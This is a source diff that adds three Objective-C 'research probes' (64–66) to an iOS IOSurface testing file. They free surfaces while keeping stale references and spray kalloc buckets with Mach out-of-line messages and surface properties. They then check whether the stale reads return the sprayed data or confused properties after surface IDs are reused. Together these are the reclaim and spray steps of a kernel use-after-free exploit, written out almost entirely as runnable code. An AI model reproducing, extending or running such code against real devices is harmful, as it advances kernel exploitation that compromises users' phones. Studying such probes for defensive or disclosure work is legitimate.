@@ -14019,3 +14019,602 @@ void iosurface_research_ptr_leak(ISRLogBlock log, ISRDoneBlock done) {
         }
     });
 }
+
+#pragma mark - Probe 64: Kalloc Size Sweep
+
+void iosurface_research_size_sweep(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"SIZESWEEP: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"SIZESWEEP: Starting kalloc bucket size sweep — testing 14 OOL sizes for zone overlap");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            int reclaimSizes[14];
+            memset(reclaimSizes, 0, sizeof(reclaimSizes));
+            int reclaimCount = 0;
+            int staleHits = 0;
+            mach_port_t oolPorts[100];
+            int oolCount = 0;
+
+            if (!setValue || !copyValue) {
+                log(@"SIZESWEEP: Missing SetValue/CopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            size_t testSizes[] = {16, 32, 48, 64, 80, 96, 128, 192, 256, 384, 512, 768, 1024, 2048};
+            int numSizes = 14;
+
+            // Step 1: Iterate each size class
+            if (!isr_stopped()) {
+                log(@"SIZESWEEP: Step 1 — Testing 14 kalloc bucket sizes");
+
+                for (int si = 0; si < numSizes && !isr_stopped(); si++) {
+                    size_t sz = testSizes[si];
+                    NSDictionary *params = isr_default_surface_params(32, 32);
+                    IOSurfaceRef victim = sym.create((__bridge CFDictionaryRef)params);
+                    if (!victim) continue;
+
+                    NSMutableData *blob = [NSMutableData dataWithLength:sz];
+                    uint32_t *words = (uint32_t *)blob.mutableBytes;
+                    for (size_t w = 0; w < sz / 4; w++) words[w] = 0xDEADBEEF;
+                    if (sz < 4) memset(blob.mutableBytes, 0xDE, sz);
+                    setValue(victim, CFSTR("SS_victim"), (__bridge CFTypeRef)blob);
+
+                    IOSurfaceID vid = sym.getID(victim);
+                    IOSurfaceRef staleRef = sym.lookup(vid);
+
+                    CFRelease(victim);
+                    victim = NULL;
+
+                    oolCount = 0;
+                    for (int i = 0; i < 100 && !isr_stopped(); i++) {
+                        mach_port_t port = MACH_PORT_NULL;
+                        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+                        if (kr != KERN_SUCCESS) continue;
+                        oolPorts[oolCount++] = port;
+                        mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+
+                        NSMutableData *oolData = [NSMutableData dataWithLength:sz];
+                        uint32_t *ow = (uint32_t *)oolData.mutableBytes;
+                        for (size_t w = 0; w < sz / 4; w++) ow[w] = 0xCAFECAFE;
+                        if (sz < 4) memset(oolData.mutableBytes, 0xCA, sz);
+
+                        typedef struct {
+                            mach_msg_header_t header;
+                            mach_msg_body_t body;
+                            mach_msg_ool_descriptor_t ool;
+                        } OOLMsg;
+
+                        OOLMsg msg;
+                        memset(&msg, 0, sizeof(msg));
+                        msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                        msg.header.msgh_size = sizeof(msg);
+                        msg.header.msgh_remote_port = port;
+                        msg.header.msgh_local_port = MACH_PORT_NULL;
+                        msg.body.msgh_descriptor_count = 1;
+                        msg.ool.address = oolData.mutableBytes;
+                        msg.ool.size = (mach_msg_size_t)sz;
+                        msg.ool.deallocate = 0;
+                        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                        mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                    }
+
+                    IOSurfaceRef relookup = sym.lookup(vid);
+                    IOSurfaceRef readRef = relookup ? relookup : staleRef;
+                    BOOL gotStale = NO;
+                    BOOL gotCafe = NO;
+
+                    if (readRef) {
+                        CFTypeRef val = copyValue(readRef, CFSTR("SS_victim"));
+                        if (val) {
+                            gotStale = YES;
+                            staleHits++;
+                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                                NSData *data = (__bridge NSData *)val;
+                                const uint32_t *rw = (const uint32_t *)data.bytes;
+                                size_t wc = data.length / 4;
+                                for (size_t w = 0; w < wc; w++) {
+                                    if (rw[w] == 0xCAFECAFE) {
+                                        gotCafe = YES;
+                                        break;
+                                    }
+                                }
+                            }
+                            CFRelease(val);
+                        }
+                    }
+
+                    if (gotCafe) {
+                        reclaimSizes[reclaimCount++] = (int)sz;
+                        anomalies += 5;
+                        log([NSString stringWithFormat:@"SIZESWEEP: *** RECLAIM HIT size=%zu — CAFE data in stale read ***", sz]);
+                    } else if (gotStale) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"SIZESWEEP: Stale read at size=%zu — DEADBEEF only (no reclaim)", sz]);
+                    } else {
+                        log([NSString stringWithFormat:@"SIZESWEEP: size=%zu — no stale data", sz]);
+                    }
+
+                    if (relookup) CFRelease(relookup);
+                    if (staleRef) CFRelease(staleRef);
+
+                    for (int i = 0; i < oolCount; i++) {
+                        mach_port_deallocate(mach_task_self(), oolPorts[i]);
+                        mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+                    }
+                }
+
+            } // end step 1
+
+            // Summary
+            if (reclaimCount > 0) {
+                NSMutableString *sizes = [NSMutableString string];
+                for (int i = 0; i < reclaimCount; i++) {
+                    if (i > 0) [sizes appendString:@", "];
+                    [sizes appendFormat:@"%d", reclaimSizes[i]];
+                }
+                log([NSString stringWithFormat:@"SIZESWEEP: Reclaim sizes found: %@", sizes]);
+            } else {
+                log([NSString stringWithFormat:@"SIZESWEEP: No reclaim at any size. Stale hits: %d/14", staleHits]);
+            }
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"SIZESWEEP: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (reclaimCount >= 3) verdict = @"CRITICAL — multiple kalloc buckets reclaimed by OOL spray";
+            else if (reclaimCount >= 1) verdict = @"HIGH — kalloc bucket overlap confirmed at specific size";
+            else if (staleHits >= 5) verdict = @"MEDIUM — stale reads widespread but no OOL reclaim";
+            else if (staleHits >= 1) verdict = @"LOW — partial stale access";
+            else verdict = @"LOW — no stale data at any size";
+            log([NSString stringWithFormat:@"SIZESWEEP: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"reclaimCount": @(reclaimCount),
+                @"staleHits": @(staleHits)
+            };
+            isr_checkpoint(@"ISR-SizeSweep-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 65: Property Cross-Spray
+
+void iosurface_research_prop_spray(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PROPSPRAY: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PROPSPRAY: Starting property cross-spray — same allocator victim/spray for guaranteed bucket match");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
+
+            #define PS_VICTIM_COUNT 30
+            #define PS_SPRAY_COUNT 30
+            IOSurfaceRef victims[PS_VICTIM_COUNT];
+            IOSurfaceID victimIDs[PS_VICTIM_COUNT];
+            IOSurfaceRef staleRefs[PS_VICTIM_COUNT];
+            IOSurfaceRef sprays[PS_SPRAY_COUNT];
+            memset(victims, 0, sizeof(victims));
+            memset(victimIDs, 0, sizeof(victimIDs));
+            memset(staleRefs, 0, sizeof(staleRefs));
+            memset(sprays, 0, sizeof(sprays));
+            int staleReads = 0;
+            int crossContam = 0;
+            int propRemoveHits = 0;
+
+            if (!setValue || !copyValue || !removeValue) {
+                log(@"PROPSPRAY: Missing property APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Step 1: Create 30 victim surfaces with 128-byte properties
+            if (!isr_stopped()) {
+                log(@"PROPSPRAY: Step 1 — Create 30 victim surfaces with 128-byte properties (0xAA)");
+                NSDictionary *params = isr_default_surface_params(32, 32);
+
+                for (int i = 0; i < PS_VICTIM_COUNT && !isr_stopped(); i++) {
+                    victims[i] = sym.create((__bridge CFDictionaryRef)params);
+                    if (!victims[i]) continue;
+                    victimIDs[i] = sym.getID(victims[i]);
+
+                    NSMutableData *blob = [NSMutableData dataWithLength:128];
+                    memset(blob.mutableBytes, 0xAA, 128);
+                    NSString *key = [NSString stringWithFormat:@"VICTIM_%d", i];
+                    setValue(victims[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
+
+                    staleRefs[i] = sym.lookup(victimIDs[i]);
+                }
+                log([NSString stringWithFormat:@"PROPSPRAY: Created %d victims with stale refs", PS_VICTIM_COUNT]);
+
+            // Step 2: Destroy all victim surfaces
+            if (!isr_stopped()) {
+                log(@"PROPSPRAY: Step 2 — Destroy all victim surfaces");
+                for (int i = 0; i < PS_VICTIM_COUNT; i++) {
+                    if (victims[i]) {
+                        CFRelease(victims[i]);
+                        victims[i] = NULL;
+                    }
+                }
+
+            // Step 3: Create 30 spray surfaces with 128-byte properties (0xBB)
+            if (!isr_stopped()) {
+                log(@"PROPSPRAY: Step 3 — Create 30 spray surfaces with 128-byte properties (0xBB)");
+                NSDictionary *params2 = isr_default_surface_params(32, 32);
+
+                for (int i = 0; i < PS_SPRAY_COUNT && !isr_stopped(); i++) {
+                    sprays[i] = sym.create((__bridge CFDictionaryRef)params2);
+                    if (!sprays[i]) continue;
+
+                    NSMutableData *blob = [NSMutableData dataWithLength:128];
+                    memset(blob.mutableBytes, 0xBB, 128);
+                    NSString *key = [NSString stringWithFormat:@"SPRAY_%d", i];
+                    setValue(sprays[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
+                }
+                log([NSString stringWithFormat:@"PROPSPRAY: Created %d spray surfaces", PS_SPRAY_COUNT]);
+
+            // Step 4: Read stale references — check for cross-contamination
+            if (!isr_stopped()) {
+                log(@"PROPSPRAY: Step 4 — Read stale victim refs for cross-contamination");
+
+                for (int i = 0; i < PS_VICTIM_COUNT && !isr_stopped(); i++) {
+                    if (!staleRefs[i]) continue;
+
+                    IOSurfaceRef relookup = sym.lookup(victimIDs[i]);
+                    IOSurfaceRef readRef = relookup ? relookup : staleRefs[i];
+
+                    NSString *victimKey = [NSString stringWithFormat:@"VICTIM_%d", i];
+                    CFTypeRef val = copyValue(readRef, (__bridge CFStringRef)victimKey);
+                    if (val) {
+                        staleReads++;
+                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                            NSData *data = (__bridge NSData *)val;
+                            const uint8_t *bytes = data.bytes;
+                            BOOL hasBB = NO;
+                            for (NSUInteger b = 0; b < data.length; b++) {
+                                if (bytes[b] == 0xBB) { hasBB = YES; break; }
+                            }
+                            if (hasBB) {
+                                crossContam++;
+                                anomalies += 5;
+                                log([NSString stringWithFormat:@"PROPSPRAY: *** CROSS-CONTAM victim %d has 0xBB spray data! ***", i]);
+                            }
+                        }
+                        CFRelease(val);
+                    }
+
+                    for (int s = 0; s < PS_SPRAY_COUNT; s++) {
+                        NSString *sprayKey = [NSString stringWithFormat:@"SPRAY_%d", s];
+                        CFTypeRef sval = copyValue(readRef, (__bridge CFStringRef)sprayKey);
+                        if (sval) {
+                            crossContam++;
+                            anomalies += 3;
+                            log([NSString stringWithFormat:@"PROPSPRAY: *** victim %d returned SPRAY_%d property! ***", i, s]);
+                            CFRelease(sval);
+                            break;
+                        }
+                    }
+
+                    if (relookup) CFRelease(relookup);
+                }
+                log([NSString stringWithFormat:@"PROPSPRAY: Stale reads: %d, cross-contaminations: %d", staleReads, crossContam]);
+
+            // Step 5: Property remove/realloc test
+            if (!isr_stopped()) {
+                log(@"PROPSPRAY: Step 5 — Property remove/realloc test on live surfaces");
+                NSDictionary *params3 = isr_default_surface_params(64, 64);
+                IOSurfaceRef surfA = sym.create((__bridge CFDictionaryRef)params3);
+                IOSurfaceRef surfB = sym.create((__bridge CFDictionaryRef)params3);
+
+                if (surfA && surfB) {
+                    NSMutableData *blobA = [NSMutableData dataWithLength:256];
+                    memset(blobA.mutableBytes, 0xCC, 256);
+                    setValue(surfA, CFSTR("REALLOC_TEST"), (__bridge CFTypeRef)blobA);
+
+                    removeValue(surfA, CFSTR("REALLOC_TEST"));
+
+                    NSMutableData *blobB = [NSMutableData dataWithLength:256];
+                    memset(blobB.mutableBytes, 0xDD, 256);
+                    setValue(surfB, CFSTR("REALLOC_TEST2"), (__bridge CFTypeRef)blobB);
+
+                    CFTypeRef readA = copyValue(surfA, CFSTR("REALLOC_TEST"));
+                    if (readA) {
+                        propRemoveHits++;
+                        anomalies += 3;
+                        log(@"PROPSPRAY: *** Removed property REALLOC_TEST still readable on surfA! ***");
+                        CFRelease(readA);
+                    } else {
+                        log(@"PROPSPRAY: Removed property correctly gone from surfA");
+                    }
+
+                    CFTypeRef readA2 = copyValue(surfA, CFSTR("REALLOC_TEST2"));
+                    if (readA2) {
+                        propRemoveHits++;
+                        anomalies += 5;
+                        log(@"PROPSPRAY: *** surfA returns surfB's REALLOC_TEST2 — property confusion! ***");
+                        CFRelease(readA2);
+                    }
+                }
+
+                if (surfA) CFRelease(surfA);
+                if (surfB) CFRelease(surfB);
+                log([NSString stringWithFormat:@"PROPSPRAY: Property remove hits: %d", propRemoveHits]);
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < PS_VICTIM_COUNT; i++) {
+                if (staleRefs[i]) CFRelease(staleRefs[i]);
+            }
+            for (int i = 0; i < PS_SPRAY_COUNT; i++) {
+                if (sprays[i]) CFRelease(sprays[i]);
+            }
+            #undef PS_VICTIM_COUNT
+            #undef PS_SPRAY_COUNT
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PROPSPRAY: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 15) verdict = @"CRITICAL — cross-surface property confusion confirmed";
+            else if (anomalies >= 8) verdict = @"HIGH — stale references return spray data";
+            else if (anomalies >= 3) verdict = @"MEDIUM — partial stale access with property overlap";
+            else if (anomalies >= 1) verdict = @"LOW — stale reads but no cross-contamination";
+            else verdict = @"LOW — no cross-contamination detected";
+            log([NSString stringWithFormat:@"PROPSPRAY: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"staleReads": @(staleReads),
+                @"crossContam": @(crossContam),
+                @"propRemoveHits": @(propRemoveHits)
+            };
+            isr_checkpoint(@"ISR-PropSpray-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 66: IOSurface ID Reuse Confusion
+
+void iosurface_research_id_reuse(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"IDREUSE: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"IDREUSE: Starting ID reuse confusion — destroy and recreate until same ID, check property confusion");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            IOSurfaceID targetID = 0;
+            IOSurfaceRef staleRef = NULL;
+            IOSurfaceRef newSurfWithSameID = NULL;
+            int idReuseFound = 0;
+            int propConfusion = 0;
+            int stalePropsReadable = 0;
+            int attempts = 0;
+
+            if (!setValue || !copyValue) {
+                log(@"IDREUSE: Missing property APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Step 1: Create original surface with 10 tagged properties
+            if (!isr_stopped()) {
+                log(@"IDREUSE: Step 1 — Create original surface with 10 tagged properties");
+                NSDictionary *params = isr_default_surface_params(32, 32);
+                IOSurfaceRef original = sym.create((__bridge CFDictionaryRef)params);
+
+                if (original) {
+                    targetID = sym.getID(original);
+
+                    for (int i = 0; i < 10; i++) {
+                        NSString *key = [NSString stringWithFormat:@"ORIG_PROP_%d", i];
+                        uint32_t tag = 0xAAAA0000 | i;
+                        NSMutableData *blob = [NSMutableData dataWithLength:64];
+                        uint32_t *words = (uint32_t *)blob.mutableBytes;
+                        for (int w = 0; w < 16; w++) words[w] = tag;
+                        setValue(original, (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
+                    }
+
+                    staleRef = sym.lookup(targetID);
+                    log([NSString stringWithFormat:@"IDREUSE: Original surface ID=%u, 10 props set, stale ref obtained", (unsigned)targetID]);
+
+                    CFRelease(original);
+                    original = NULL;
+                    log(@"IDREUSE: Original surface destroyed");
+                } else {
+                    log(@"IDREUSE: Failed to create original surface");
+                }
+
+            // Step 2: Create surfaces until we get the same ID
+            if (!isr_stopped() && targetID > 0) {
+                log(@"IDREUSE: Step 2 — Creating surfaces until ID reuse");
+                NSDictionary *params2 = isr_default_surface_params(32, 32);
+                IOSurfaceRef tempSurfs[500];
+                int tempCount = 0;
+
+                for (int i = 0; i < 500 && !isr_stopped(); i++) {
+                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params2);
+                    if (!s) continue;
+                    attempts++;
+                    IOSurfaceID sid = sym.getID(s);
+
+                    if (sid == targetID) {
+                        newSurfWithSameID = s;
+                        idReuseFound = 1;
+                        anomalies += 3;
+                        log([NSString stringWithFormat:@"IDREUSE: *** ID REUSE after %d attempts! ID=%u ***", attempts, (unsigned)sid]);
+                        break;
+                    }
+                    tempSurfs[tempCount++] = s;
+                }
+
+                for (int i = 0; i < tempCount; i++) {
+                    CFRelease(tempSurfs[i]);
+                }
+
+                if (!idReuseFound) {
+                    log([NSString stringWithFormat:@"IDREUSE: No ID reuse after %d attempts", attempts]);
+                }
+
+            // Step 3: If ID reuse, set different properties on new surface
+            if (!isr_stopped() && newSurfWithSameID) {
+                log(@"IDREUSE: Step 3 — Setting new properties on reused-ID surface");
+
+                for (int i = 0; i < 5; i++) {
+                    NSString *key = [NSString stringWithFormat:@"NEW_PROP_%d", i];
+                    uint32_t tag = 0xBBBB0000 | i;
+                    NSMutableData *blob = [NSMutableData dataWithLength:64];
+                    uint32_t *words = (uint32_t *)blob.mutableBytes;
+                    for (int w = 0; w < 16; w++) words[w] = tag;
+                    setValue(newSurfWithSameID, (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
+                }
+                log(@"IDREUSE: 5 new properties set on reused surface");
+
+            // Step 4: Read via stale ref — check for property confusion
+            if (!isr_stopped()) {
+                log(@"IDREUSE: Step 4 — Read stale ref properties, check for confusion");
+
+                for (int i = 0; i < 10 && !isr_stopped(); i++) {
+                    NSString *key = [NSString stringWithFormat:@"ORIG_PROP_%d", i];
+                    CFTypeRef val = copyValue(staleRef, (__bridge CFStringRef)key);
+                    if (val) {
+                        stalePropsReadable++;
+                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                            NSData *data = (__bridge NSData *)val;
+                            const uint32_t *words = (const uint32_t *)data.bytes;
+                            if (data.length >= 4) {
+                                uint32_t expected = 0xAAAA0000 | i;
+                                if (words[0] != expected) {
+                                    propConfusion++;
+                                    anomalies += 3;
+                                    log([NSString stringWithFormat:@"IDREUSE: *** PROP CONFUSION ORIG_%d expected 0x%08X got 0x%08X ***",
+                                         i, expected, words[0]]);
+                                }
+                            }
+                        }
+                        CFRelease(val);
+                    }
+                }
+
+                for (int i = 0; i < 5 && !isr_stopped(); i++) {
+                    NSString *key = [NSString stringWithFormat:@"NEW_PROP_%d", i];
+                    CFTypeRef val = copyValue(staleRef, (__bridge CFStringRef)key);
+                    if (val) {
+                        anomalies += 2;
+                        propConfusion++;
+                        log([NSString stringWithFormat:@"IDREUSE: *** Stale ref reads NEW_PROP_%d from reused surface! ***", i]);
+                        CFRelease(val);
+                    }
+                }
+
+                IOSurfaceRef relookup = sym.lookup(targetID);
+                if (relookup) {
+                    for (int i = 0; i < 10 && !isr_stopped(); i++) {
+                        NSString *key = [NSString stringWithFormat:@"ORIG_PROP_%d", i];
+                        CFTypeRef val = copyValue(relookup, (__bridge CFStringRef)key);
+                        if (val) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"IDREUSE: *** Relookup returns OLD property ORIG_%d ***", i]);
+                            CFRelease(val);
+                        }
+                    }
+                    CFRelease(relookup);
+                }
+
+                log([NSString stringWithFormat:@"IDREUSE: Stale props readable: %d/10, confusion: %d", stalePropsReadable, propConfusion]);
+
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            if (staleRef) CFRelease(staleRef);
+            if (newSurfWithSameID) CFRelease(newSurfWithSameID);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"IDREUSE: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (propConfusion >= 5) verdict = @"CRITICAL — full property confusion via ID reuse, stale ref reads new surface data";
+            else if (propConfusion >= 2) verdict = @"HIGH — property confusion confirmed, partial cross-read";
+            else if (idReuseFound) verdict = @"MEDIUM — ID reuse achieved but properties isolated";
+            else if (stalePropsReadable > 0) verdict = @"LOW — stale ref readable but no ID reuse";
+            else verdict = @"LOW — no ID reuse or stale access";
+            log([NSString stringWithFormat:@"IDREUSE: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"idReuseFound": @(idReuseFound),
+                @"attempts": @(attempts),
+                @"propConfusion": @(propConfusion),
+                @"stalePropsReadable": @(stalePropsReadable)
+            };
+            isr_checkpoint(@"ISR-IDReuse-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
